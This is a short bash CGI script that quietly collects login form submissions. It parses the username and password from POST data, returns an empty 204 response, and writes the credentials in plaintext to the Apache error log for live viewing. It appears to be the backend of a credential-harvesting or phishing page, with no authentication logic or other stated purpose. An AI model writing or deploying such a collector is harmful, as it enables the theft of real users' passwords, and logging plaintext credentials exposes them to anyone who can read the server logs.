#!/bin/bash
echo "Status: 204 No Content"
echo "Content-type: text/plain"
echo ""

# Read POST data
read -n $CONTENT_LENGTH POST_DATA

# Parse for readability
USERNAME=$(echo "$POST_DATA" | sed -n 's/.*username=\([^&]*\).*/\1/p' | sed 's/%20/ /g')
PASSWORD=$(echo "$POST_DATA" | sed -n 's/.*password=\([^&]*\).*/\1/p' | sed 's/%20/ /g')

# Print nicely to Apache error log (shows in terminal with `journalctl -f -u apache2`)
echo "[LOGIN DATA] Username: $USERNAME | Password: $PASSWORD" >&2
